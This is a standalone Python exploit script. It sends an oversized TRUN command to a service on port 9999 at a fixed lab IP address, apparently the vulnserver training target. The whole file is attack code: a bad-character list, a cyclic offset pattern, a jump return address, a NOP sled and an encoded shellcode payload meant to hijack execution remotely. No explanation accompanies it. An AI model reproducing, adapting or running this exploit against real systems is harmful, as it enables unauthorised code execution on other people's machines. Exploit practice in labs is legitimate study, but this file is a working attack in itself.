#!/usr/bin/python

import socket           # Import socket librarires for use in script

host = ("10.20.40.50", 9999)

badchars = "0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff"

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9"
 
shell = ( ""
"\xf9\x98\x4a\xf8\x41\xfc\x2f\x27\x27\x90\x48\x98\x43"
"\xf9\x40\x27\xba\x2c\x19\x83\xd7\xdb\xcc\xd9\x74\x24"
"\xf4\x5e\x33\xc9\xb1\x52\x31\x56\x12\x03\x56\x12\x83"
"\xc2\xe5\x61\x22\xe6\xfe\xe4\xcd\x16\xff\x88\x44\xf3"
"\xce\x88\x33\x70\x60\x39\x37\xd4\x8d\xb2\x15\xcc\x06"
"\xb6\xb1\xe3\xaf\x7d\xe4\xca\x30\x2d\xd4\x4d\xb3\x2c"
"\x09\xad\x8a\xfe\x5c\xac\xcb\xe3\xad\xfc\x84\x68\x03"
"\x10\xa0\x25\x98\x9b\xfa\xa8\x98\x78\x4a\xca\x89\x2f"
"\xc0\x95\x09\xce\x05\xae\x03\xc8\x4a\x8b\xda\x63\xb8"
"\x67\xdd\xa5\xf0\x88\x72\x88\x3c\x7b\x8a\xcd\xfb\x64"
"\xf9\x27\xf8\x19\xfa\xfc\x82\xc5\x8f\xe6\x25\x8d\x28"
"\xc2\xd4\x42\xae\x81\xdb\x2f\xa4\xcd\xff\xae\x69\x66"
"\xfb\x3b\x8c\xa8\x8d\x78\xab\x6c\xd5\xdb\xd2\x35\xb3"
"\x8a\xeb\x25\x1c\x72\x4e\x2e\xb1\x67\xe3\x6d\xde\x44"
"\xce\x8d\x1e\xc3\x59\xfe\x2c\x4c\xf2\x68\x1d\x05\xdc"
"\x6f\x62\x3c\x98\xff\x9d\xbf\xd9\xd6\x59\xeb\x89\x40"
"\x4b\x94\x41\x90\x74\x41\xc5\xc0\xda\x3a\xa6\xb0\x9a"
"\xea\x4e\xda\x14\xd4\x6f\xe5\xfe\x7d\x05\x1c\x69\x88"
"\xc4\x2c\x61\xe4\xfa\x50\x70\x4f\x73\xb6\x18\xbf\xd2"
"\x61\xb5\x26\x7f\xf9\x24\xa6\x55\x84\x67\x2c\x5a\x79"
"\x29\xc5\x17\x69\xde\x25\x62\xd3\x49\x39\x58\x7b\x15"
"\xa8\x07\x7b\x50\xd1\x9f\x2c\x35\x27\xd6\xb8\xab\x1e"
"\x40\xde\x31\xc6\xab\x5a\xee\x3b\x35\x63\x63\x07\x11"
"\x73\xbd\x88\x1d\x27\x11\xdf\xcb\x91\xd7\x89\xbd\x4b"
"\x8e\x66\x14\x1b\x57\x45\xa7\x5d\x58\x80\x51\x81\xe9"
"\x7d\x24\xbe\xc6\xe9\xa0\xc7\x3a\x8a\x4f\x12\xff\xba"
"\x05\x3e\x56\x53\xc0\xab\xea\x3e\xf3\x06\x28\x47\x70"
"\xa2\xd1\xbc\x68\xc7\xd4\xf9\x2e\x34\xa5\x92\xda\x3a"
"\x1a\x92\xce")

buffer = "TRUN /.:/"
buffer += "A" * 2003
buffer += "\xAF\x11\x50\x62"
buffer += "\x90"*16 + shell + "C" * (5060-2003-4-16-len(shell))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect ((host))
s.recv (1024)
s.send (buffer)
s.close

